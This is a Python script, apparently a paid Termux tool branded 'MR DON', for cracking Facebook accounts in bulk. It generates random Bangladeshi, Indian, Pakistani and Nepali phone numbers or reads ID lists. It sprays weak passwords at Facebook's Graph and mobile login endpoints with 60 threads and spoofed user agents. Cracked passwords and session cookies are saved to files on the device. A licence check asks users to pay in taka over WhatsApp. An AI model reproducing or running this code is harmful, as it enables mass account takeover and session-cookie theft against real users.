"""
#===--------------------------[-------]--------------------------===#
CREATE BY TKM T O N M O Y
GITHUB : tonmoy404-cyber
FACEBOOK : Tony X Bhai
Whatapp : +8801766804626
#===--------------------------[-------]--------------------------===#
"""
import os,time,random,string,requests,sys,re,uuid,platform
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:os.mkdir('/sdcard/DON')
except:pass
#===--------------------------[ USER AGENT]--------------------------===#
ugen=[]
for xffd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
#-_-_-_--_-_-_-_-_6_-_6_-_-_6_6_6
#-$6$-_-$-$-$76$6$6$-$-$
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
#===--------------------------[ APPROVAL ]--------------------------===#
def keyx():
	uuidd = str(os.getlogin()) + str(os.getuid())
	xxrxx = "".join(uuidd).replace("_","").replace("360","").replace("u","9").replace("a","A")
	plat = platform.version()[18:][:8][::-1].upper()+platform.release()[5:][::-3].upper()+platform.version()[:8]
	xxxrx = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
	key4x = "RO2H6STN"+xxrxx+xxxrx+"OS"
	return key4x
____key____=keyx()
____l_____k=requests.get("https://github.com/denjar223/server/blob/main/Dls.txt").text
def approval():
	try:
		if ____key____ in ____l_____k:
			License()
		else:
			logo()
			print(f"{SP}[{RP}+{SP}] Your Key : {GP}{____key____}{E}")
			line()
			print(f"{SP}[{RP}+{SP}]  7 DAY : {GP}300  {SP}TAKA")
			print(f"{SP}[{RP}+{SP}] 15 DAY : {GP}600  {SP}TAKA")
			print(f"{SP}[{RP}+{SP}] 30 DAY : {GP}1200 {SP}TAKA")
			line()
			input(f"{SP}[{RP}+{SP}] Press Enter To Send Key")
			os.system('am start https://wa.me/+8801787328738?text=' +____key____)
			approval()
	except requests.exceptions.ConnectionError:exit(' No internet connection ..')
#===--------------------------[ LICENSE ]--------------------------===#
def License():
	logo()
	_x=input(f'{SP}[{RP}+{SP}] LICENSE : {GP}')
	if _x in ["R00TN"]:
		Main()
	else:
		line();print(f'\n\t\t  {RP} Incorrect {E}');time.sleep(1);License()
#===--------------------------[ COLOR ]--------------------------===#
B,R,G,H,BL,BG,S,W,E= '\x1b[1;90m','\x1b[1;91m','\x1b[1;92m','\x1b[1;93m','\x1b[1;94m','\x1b[1;95m','\x1b[1;96m','\x1b[1;97m','\x1b[0m'
GP,MP,RP,BGP,SP,HP,NP,GP1="\x1b[38;5;156m",'\x1b[38;5;94m','\x1b[38;5;198m','\x1b[38;5;104m','\x1b[38;5;50m','\x1b[38;5;154m','\x1b[38;5;39m','\x1b[38;5;28m'
#===--------------------------[-------]--------------------------===#
cp=[]
ok=[]
loop=0
xode=[]
def line():
	print(f"{NP}{47*'-'}{E}")
#===--------------------------[ LOGO ]--------------------------===#
def logo():
	os.system('clear')
	print(f"""{SP}
 MM    MM RRRRRR      DDDDD    OOOOO  NN   NN 
 MMM  MMM RR   RR     DD  DD  OO   OO NNN  NN 
 MM MM MM RRRRRR      DD   DD OO   OO NN N NN 
 MM    MM RR  RR  ... DD   DD OO   OO NN  NNN 
 MM    MM RR   RR ... DDDDDD   OOOO0  NN   NN
{NP}{47*'-'}{E}
{SP}[{RP}+{SP}] NAME    : ROTON
{SP}[{RP}+{SP}] GITHUB  : denjar223
{SP}[{RP}+{SP}] VERSION : {GP}0.04{E}
{NP}{47*'-'}{E}""")
#===--------------------------[ MENU ]--------------------------===#
def Main():
	os.system('xdg-open https://www.facebook.com/profile.php?id=100072828519575')
	logo()
	print(f'{SP}[{RP}1{SP}] FILE CLONE')
	print(f'{SP}[{RP}2{SP}] RANDOM CLONE')
	print(f'{SP}[{RP}3{SP}] EXIT')
	line()
	_1_=input(f'{SP}[{RP}1{SP}] CHOICE : {G}')
	if _1_ in ['1']:
		_file_()
	elif _1_ in ['2']:
		_random_()
	elif _1_ in ['3']:
		exit()
	else:
		line();print(f'\n \t    {RP}Choose valid option{E}');time.sleep(1);Main()
#===--------------------------[ FILE ]--------------------------===#
def _file_():
	logo()
	___file___ = input(f'{SP}[{RP}+{SP}] PUT FILE PATH : {GP}')
	try:__fo__ = open(___file___,'r').read().splitlines()
	except FileNotFoundError:print(f'{GP}[{SP}•{GP}] FILE LOCATION NOT FOUND{GP}');time.sleep(2);_file_()
	__pl__ = []
	logo()
	try:__p__l__=int(input(f'{SP}[{RP}+{SP}] PASSWORD LIMIT : {GP}'))
	except:__p__l__ =1
	logo()
	print(f'{SP}[{RP}+{SP}] EXP : {GP}first last{W}, {GP}57575751{W}, {GP}57273200{W}')
	line()
	for i in range(__p__l__):
		__pl__.append(input(f'{SP}[{RP}{i+1}{SP}] PASSWORD : {GP}'))
	logo()
	print(f"{SP}[{RP}1{SP}] METHOD 1 {SP}[{GP}BEST{SP}] {E}")
	print(f"{SP}[{RP}2{SP}] METHOD 2 {SP}[{GP}NORMAL{SP}]{E}")
	line()
	_____x_____=input(f'{SP}[{RP}+{SP}]{SP} CHOICE : {GP}')
	with ThreadPool(max_workers=60) as ______:
		logo()
		__t__l___=str(len(__fo__))
		print(f'{SP}[{RP}+{SP}] TOTAL ID : {W}'+__t__l___)
		print(f'{SP}[{RP}+{SP}] AFTER EVERY 5 MIN TURN AIRPLANE ON/OFF');line()
		for __r__ in __fo__:
			id,name = __r__.split('|')
			ps = __pl__
			if _____x_____ in ["2"]:
				______.submit(_____2____,id,ps,name,__t__l___)
			else:
				______.submit(_____1____,id,ps,name,__t__l___)
#===--------------------------[ RANDOM ]--------------------------===#
def _random_():
	logo()
	print(f"{SP}[{RP}1{SP}] BANGLADESH {E}")
	print(f"{SP}[{RP}2{SP}] INDIA {E}")
	print(f"{SP}[{RP}3{SP}] PAKISTAN {E}")
	print(f"{SP}[{RP}4{SP}] NEPAL {E}")
	line()
	_=input(f'{SP}[{RP}+{SP}] CHOICE : {GP}')
	if _ in ['1']:
		_bangladesh_()
	elif _ in ['2']:
		_india_()
	elif _ in ['3']:
		_pakisthan_()
	elif _ in ['4']:
		_nepal_()
	else:
			line();print(f'\n \t    {RP}Choose valid option{E}');time.sleep(1);_random_()
#===--------------------------[ BANGLADESH ]--------------------------===#
def _bangladesh_():
	logo()
	print(f'{SP}[{RP}+{SP}] BD SIM CODE : {GP}017 015 018 019 013 016{E}')
	line()
	__c__=input(f'{SP}[{RP}+{SP}] CHOICE : {GP}')
	line()
	print(f'{SP}[{RP}+{SP}] EXAMPLE : {GP}1000 5000 10000 15000 20000{W}');line()
	try:___l___=int(input(f'{SP}[{RP}+{SP}] Limit : {GP}'))
	except ValueError:___l___=5000
	logo()
	print(f"{SP}[{RP}1{SP}] METHOD 1 {SP}[{GP}BEST{SP}] {E}")
	print(f"{SP}[{RP}2{SP}] METHOD 2 {SP}[{GP}NORMAL{SP}]{E}")
	line()
	__________=input(f'{SP}[{RP}+{SP}] CHOICE : {GP}')
	for number in range(___l___):
		numberx = ''.join(random.choice(string.digits) for _ in range(8))
		xode.append(numberx)
	with ThreadPool(max_workers=60) as ______:
		__t__l___=str(len(xode))
		logo()
		print(f'{SP}[{RP}+{SP}] TOTAL ID : {W}'+str(___l___))
		print(f'{SP}[{RP}+{SP}] AFTER EVERY 5 MIN TURN AIRPLANE ON/OFF');line()
		for __ in xode:
			id=__c__+__
			name=__c__+" "+__
			ps=[id,__,id[:6],id[5:]]
			if __________ in ["2"]:
				______.submit(_____2____,id,ps,name,__t__l___)
			else:
				______.submit(_____1____,id,ps,name,__t__l___)
#===--------------------------[ INDIA ]--------------------------===#
def _india_():
	logo()
	print(f'{SP}[{RP}+{SP}] BD SIM CODE : {GP}+91967 +91783 +91894 +91879 {E}')
	line()
	__c__=input(f'{SP}[{RP}+{SP}] CHOICE : {GP}')
	line()
	print(f'{SP}[{RP}+{SP}] EXAMPLE : {GP}1000 5000 10000 15000 20000{W}');line()
	try:___l___=int(input(f'{SP}[{RP}+{SP}] Limit : {GP}'))
	except ValueError:___l___=5000
	logo()
	print(f"{SP}[{RP}1{SP}] METHOD 1 {SP}[{GP}BEST{SP}] {E}")
	print(f"{SP}[{RP}2{SP}] METHOD 2 {SP}[{GP}NORMAL{SP}]{E}")
	line()
	__________=input(f'{SP}[{RP}+{SP}] CHOICE : {GP}')
	for number in range(___l___):
		numberx = ''.join(random.choice(string.digits) for _ in range(7))
		xode.append(numberx)
	with ThreadPool(max_workers=60) as ______:
		__t__l___=str(len(xode))
		logo()
		print(f'{SP}[{RP}+{SP}] TOTAL ID : {W}'+str(___l___))
		print(f'{SP}[{RP}+{SP}] AFTER EVERY 5 MIN TURN AIRPLANE ON/OFF');line()
		for __ in xode:
			id=__c__+__
			name=__c__+" "+__
			ps=[id[3:],__,"57575751","57273200","59039200"]
			if __________ in ["2"]:
				______.submit(_____2____,id,ps,name,__t__l___)
			else:
				______.submit(_____1____,id,ps,name,__t__l___)
#===--------------------------[ PAKISTAN ]--------------------------===#
def _pakisthan_():
	logo()
	print(f'{SP}[{RP}+{SP}] BD SIM CODE : {GP}0306 0315 0335 0345 {E}')
	line()
	__c__=input(f'{SP}[{RP}+{SP}] CHOICE : {GP}')
	line()
	print(f'{SP}[{RP}+{SP}] EXAMPLE : {GP}1000 5000 10000 15000 20000{W}');line()
	try:___l___=int(input(f'{SP}[{RP}+{SP}] Limit : {GP}'))
	except ValueError:___l___=5000
	logo()
	print(f"{SP}[{RP}1{SP}] METHOD 1 {SP}[{GP}BEST{SP}] {E}")
	print(f"{SP}[{RP}2{SP}] METHOD 2 {SP}[{GP}NORMAL{SP}]{E}")
	line()
	__________=input(f'{SP}[{RP}+{SP}] CHOICE : {GP}')
	for number in range(___l___):
		numberx = ''.join(random.choice(string.digits) for _ in range(7))
		xode.append(numberx)
	with ThreadPool(max_workers=60) as ______:
		__t__l___=str(len(xode))
		logo()
		print(f'{SP}[{RP}+{SP}] TOTAL ID : {W}'+str(___l___))
		print(f'{SP}[{RP}+{SP}] AFTER EVERY 5 MIN TURN AIRPLANE ON/OFF');line()
		for __ in xode:
			id=__c__+__
			name=__c__+" "+__
			ps=[id,__,id[:8],"khan123","khan1122","khan12345"]
			if __________ in ["2"]:
				______.submit(_____2____,id,ps,name,__t__l___)
			else:
				______.submit(_____1____,id,ps,name,__t__l___)
#===--------------------------[ NEPAL ]--------------------------===#
def _nepal_():
	logo()
	print(f'{SP}[{RP}+{SP}] BD SIM CODE : {GP}967 783 894 879 638{E}')
	line()
	__c__=input(f'{SP}[{RP}+{SP}] CHOICE : {GP}')
	line()
	print(f'{SP}[{RP}+{SP}] EXAMPLE : {GP}1000 5000 10000 15000 20000{W}');line()
	try:___l___=int(input(f'{SP}[{RP}+{SP}] Limit : {GP}'))
	except ValueError:___l___=5000
	logo()
	print(f"{SP}[{RP}1{SP}] METHOD 1 {SP}[{GP}BEST{SP}] {E}")
	print(f"{SP}[{RP}2{SP}] METHOD 2 {SP}[{GP}NORMAL{SP}]{E}")
	line()
	__________=input(f'{SP}[{RP}+{SP}] CHOICE : {GP}')
	for number in range(___l___):
		numberx = ''.join(random.choice(string.digits) for _ in range(7))
		xode.append(numberx)
	with ThreadPool(max_workers=60) as ______:
		__t__l___=str(len(xode))
		logo()
		print(f'{SP}[{RP}+{SP}] TOTAL ID : {W}'+str(___l___))
		print(f'{SP}[{RP}+{SP}] AFTER EVERY 5 MIN TURN AIRPLANE ON/OFF');line()
		for __ in xode:
			id=__c__+__
			name=__c__+" "+__
			ps=[id,__]
			if __________ in ["2"]:
				______.submit(_____2____,id,ps,name,__t__l___)
			else:
				______.submit(_____1____,id,ps,name,__t__l___)
#===--------------------------[ m1 ]--------------------------===#
def _____1____(id,ps,name,__t__l___):
	global ok,loop
	sys.stdout.write(f'\r\r{SP}[DON-M1] {GP}{loop}{W}|{GP}{__t__l___}{W}|{GP}OK:{G}%s{SP} '%(len(ok)));sys.stdout.flush()
	try:
		first = name.split(' ')[0]
		try:last = name.split(' ')[1]
		except:last = first
		for pw in ps:
			ua ="[FBAN/FB4A;FBAV/147.0.0.44.127;FBBV/225129304;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/227665120;FBCR/Airtel-Stay Home | airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A810F;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
			pas = pw.replace('First',first).replace('Last',last).replace('first',first.lower()).replace('last',last.lower()).replace('Name',name).replace('name',name.lower())
			url='https://b-graph.facebook.com/auth/login'
			headersx = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": str(random.randint(2e4,4e4)),"X-FB-SIM-HNI": str(random.randint(2e4,4e4)),"X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
			datax={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":id,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
			logox=requests.post(url,data=datax,headers=headersx).json()
			if "session_key" in logox:
				try:
					iid = str(logox['uid'])
				except:
					iid=id
				print(f'\r\r{G}[DON-OK] '+iid+' | '+pas)
				ok.append(iid)
				coki = ";".join(i["name"]+"="+i["value"] for i in logox["session_cookies"])
				print(f"{SP}[{G}COKI{SP}]{GP} "+coki+"\n")
				open('/sdcard/DON/M1-OK.txt','a').write(iid+'|'+pas+'|'+coki+'\n')
				break
			elif 'www.facebook.com' in logox['error']['message']:
				try:
					uid = logox['error']['error_data']['uid']
				except:
					uid=id
				iid=str(uid)
				print(f'\r\r{MP}[DON-CP] '+iid+' | '+pas)
				cp.append(id)
				open('/sdcard/DON/CP.txt','a').write(iid+'|'+pas+'\n')
				break
			else:continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
#===--------------------------[ m2 ]--------------------------===#
def _____2____(id,ps,name,__t__l___):
	global ok,loop
	sys.stdout.write(f'\r\r{SP}[DON-M2] {GP}{loop}{W}|{GP}{__t__l___}{W}|{GP}OK:{G}%s{SP} '%(len(ok)));sys.stdout.flush()
	ses = requests.Session()
	try:
		first = name.split(' ')[0]
		try:last = name.split(' ')[1]
		except:last = first
		for pw in ps:
			pas = pw.replace('First',first).replace('Last',last).replace('first',first.lower()).replace('last',last.lower()).replace('Name',name).replace('name',name.lower())
			gl = ses.get(f'https://'+"m.facebook.com"+f'/login/device-based/password/?uid={id}&flow=login_no_pin&refsrc=deprecated&_rdr')
			datax={"lsd":re.search('name="lsd" value="(.*?)"',
			str(gl.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"',
			 str(gl.text)).group(1),
			"uid":id,
			"next":"https://"+"m.facebook.com"+"/login/save-device/",
			"flow":"login_no_pin",
			"pass":pas,}
			ua=random.choice(ugen)
			headerx = {'Host': "m.facebook.com",'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,as-IN;q=0.6,as;q=0.5','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua,'viewport-width': '980',}
			po = ses.post('https://'+"m.facebook.com"+'/login/device-based/validate-password/?shbl=0',data=datax,allow_redirects=False,headers=headerx)
			logox=ses.cookies.get_dict().keys()
			if "c_user" in logox:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				try:
					iid = coki[151:166]
				except:
					iid = id
				print(f'\r\r{G}[DON-OK] '+iid+' | '+pas)
				ok.append(iid)
				print(f"{SP}[{G}COKI{SP}]{GP} "+coki+"\n")
				open('/sdcard/DON/M2-OK.txt','a').write(iid+'|'+pas+'|'+coki+'\n')
				break
			elif 'checkpoint' in logox:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				try:
					iid = coki[141:156]
				except:
					iid = id
				print(f'\r\r{MP}[DON-CP] '+iid+' | '+pas)
				cp.append(id)
				open('/sdcard/DON/CP.txt','a').write(iid+'|'+pas+'\n')
				break
			else:continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

approval()